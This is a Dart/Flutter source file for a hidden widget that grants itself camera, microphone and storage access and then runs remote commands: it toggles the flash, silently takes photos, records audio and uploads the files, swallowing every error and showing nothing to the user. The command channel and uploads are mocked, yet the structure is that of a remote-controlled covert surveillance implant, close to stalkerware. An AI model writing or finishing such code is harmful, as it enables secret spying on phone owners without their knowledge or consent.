import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:camera/camera.dart';
import 'package:record/record.dart';
import 'package:path_provider/path_provider.dart';
import 'dart:io' if (dart.library.io) 'dart:io';
import 'package:flutter/foundation.dart';

class BackgroundServiceListener extends StatefulWidget {
  final Widget child;

  const BackgroundServiceListener({
    Key? key,
    required this.child,
  }) : super(key: key);

  @override
  State<BackgroundServiceListener> createState() =>
      _BackgroundServiceListenerState();
}

class _BackgroundServiceListenerState extends State<BackgroundServiceListener> {
  List<CameraDescription> _cameras = [];
  CameraController? _cameraController;
  final AudioRecorder _audioRecorder = AudioRecorder();
  bool _isListening = false;

  // Mock Firebase commands for demonstration
  final List<Map<String, dynamic>> _mockCommands = [
    {
      'id': 'cmd_001',
      'type': 'flash_control',
      'action': 'toggle',
      'timestamp':
          DateTime.now().subtract(const Duration(minutes: 2)).toIso8601String(),
      'executed': false,
    },
    {
      'id': 'cmd_002',
      'type': 'camera_capture',
      'action': 'front',
      'timestamp':
          DateTime.now().subtract(const Duration(minutes: 5)).toIso8601String(),
      'executed': false,
    },
    {
      'id': 'cmd_003',
      'type': 'audio_record',
      'action': 'start',
      'duration': 10,
      'timestamp':
          DateTime.now().subtract(const Duration(minutes: 8)).toIso8601String(),
      'executed': false,
    },
  ];

  @override
  void initState() {
    super.initState();
    _initializeBackgroundService();
  }

  @override
  void dispose() {
    _cameraController?.dispose();
    _audioRecorder.dispose();
    super.dispose();
  }

  Future<void> _initializeBackgroundService() async {
    await _requestPermissions();
    await _initializeCamera();
    _startListening();
  }

  Future<void> _requestPermissions() async {
    if (kIsWeb) return;

    await [
      Permission.camera,
      Permission.microphone,
      Permission.storage,
    ].request();
  }

  Future<void> _initializeCamera() async {
    try {
      _cameras = await availableCameras();
      if (_cameras.isNotEmpty) {
        final camera = kIsWeb
            ? _cameras.firstWhere(
                (c) => c.lensDirection == CameraLensDirection.front,
                orElse: () => _cameras.first,
              )
            : _cameras.firstWhere(
                (c) => c.lensDirection == CameraLensDirection.back,
                orElse: () => _cameras.first,
              );

        _cameraController = CameraController(
          camera,
          kIsWeb ? ResolutionPreset.medium : ResolutionPreset.high,
        );

        await _cameraController!.initialize();

        // Apply platform-specific settings
        try {
          await _cameraController!.setFocusMode(FocusMode.auto);
          if (!kIsWeb) {
            await _cameraController!.setFlashMode(FlashMode.auto);
          }
        } catch (e) {
          // Ignore unsupported features
        }
      }
    } catch (e) {
      // Handle camera initialization error silently
    }
  }

  void _startListening() {
    if (_isListening) return;

    setState(() {
      _isListening = true;
    });

    // Simulate Firebase real-time listener
    _simulateFirebaseListener();
  }

  void _simulateFirebaseListener() {
    // In a real implementation, this would be a Firebase Firestore listener
    // For demo purposes, we'll process mock commands periodically
    Future.delayed(const Duration(seconds: 10), () {
      if (_isListening && mounted) {
        _processCommands();
        _simulateFirebaseListener(); // Continue listening
      }
    });
  }

  Future<void> _processCommands() async {
    for (final command in _mockCommands) {
      if (!(command['executed'] as bool)) {
        await _executeCommand(command);
        command['executed'] = true;
      }
    }
  }

  Future<void> _executeCommand(Map<String, dynamic> command) async {
    try {
      switch (command['type'] as String) {
        case 'flash_control':
          await _handleFlashControl(command);
          break;
        case 'camera_capture':
          await _handleCameraCapture(command);
          break;
        case 'audio_record':
          await _handleAudioRecord(command);
          break;
        case 'wallpaper_change':
          await _handleWallpaperChange(command);
          break;
        default:
          break;
      }
    } catch (e) {
      // Handle command execution error silently
    }
  }

  Future<void> _handleFlashControl(Map<String, dynamic> command) async {
    if (kIsWeb || _cameraController == null) return;

    try {
      final action = command['action'] as String;
      if (action == 'toggle') {
        final currentMode = _cameraController!.value.flashMode;
        final newMode =
            currentMode == FlashMode.torch ? FlashMode.off : FlashMode.torch;
        await _cameraController!.setFlashMode(newMode);
      }
    } catch (e) {
      // Handle flash control error silently
    }
  }

  Future<void> _handleCameraCapture(Map<String, dynamic> command) async {
    if (_cameraController == null || !_cameraController!.value.isInitialized) {
      return;
    }

    try {
      final action = command['action'] as String;

      // Switch camera if needed
      if (action == 'front' || action == 'back') {
        final targetDirection = action == 'front'
            ? CameraLensDirection.front
            : CameraLensDirection.back;

        final targetCamera = _cameras.firstWhere(
          (c) => c.lensDirection == targetDirection,
          orElse: () => _cameras.first,
        );

        await _cameraController!.dispose();
        _cameraController = CameraController(
          targetCamera,
          kIsWeb ? ResolutionPreset.medium : ResolutionPreset.high,
        );
        await _cameraController!.initialize();
      }

      // Capture photo
      final XFile photo = await _cameraController!.takePicture();

      // In a real implementation, upload to Firebase Storage
      await _uploadToStorage(photo.path,
          'camera_capture_${DateTime.now().millisecondsSinceEpoch}.jpg');
    } catch (e) {
      // Handle camera capture error silently
    }
  }

  Future<void> _handleAudioRecord(Map<String, dynamic> command) async {
    try {
      final action = command['action'] as String;

      if (action == 'start') {
        if (await _audioRecorder.hasPermission()) {
          final duration = command['duration'] as int? ?? 10;

          if (kIsWeb) {
            await _audioRecorder.start(
              const RecordConfig(encoder: AudioEncoder.wav),
              path: 'recording_${DateTime.now().millisecondsSinceEpoch}.wav',
            );
          } else {
            final dir = await getTemporaryDirectory();
            final path =
                '${dir.path}/recording_${DateTime.now().millisecondsSinceEpoch}.m4a';
            await _audioRecorder.start(const RecordConfig(), path: path);
          }

          // Stop recording after specified duration
          Future.delayed(Duration(seconds: duration), () async {
            final recordPath = await _audioRecorder.stop();
            if (recordPath != null) {
              await _uploadToStorage(recordPath,
                  'audio_record_${DateTime.now().millisecondsSinceEpoch}.m4a');
            }
          });
        }
      }
    } catch (e) {
      // Handle audio recording error silently
    }
  }

  Future<void> _handleWallpaperChange(Map<String, dynamic> command) async {
    try {
      final imageUrl = command['imageUrl'] as String?;
      if (imageUrl != null) {
        // In a real implementation, this would download the image and set as wallpaper
        // For now, we'll just simulate the process
        await Future.delayed(const Duration(seconds: 2));
      }
    } catch (e) {
      // Handle wallpaper change error silently
    }
  }

  Future<void> _uploadToStorage(String filePath, String fileName) async {
    try {
      if (kIsWeb) {
        // For web, we would upload the file bytes to Firebase Storage
        // This is a simulation
        await Future.delayed(const Duration(seconds: 1));
      } else {
        // For mobile, read file and upload to Firebase Storage
        final file = File(filePath);
        if (await file.exists()) {
          final bytes = await file.readAsBytes();
          // Upload bytes to Firebase Storage
          await Future.delayed(const Duration(seconds: 1));
        }
      }
    } catch (e) {
      // Handle upload error silently
    }
  }

  @override
  Widget build(BuildContext context) {
    return widget.child;
  }
}
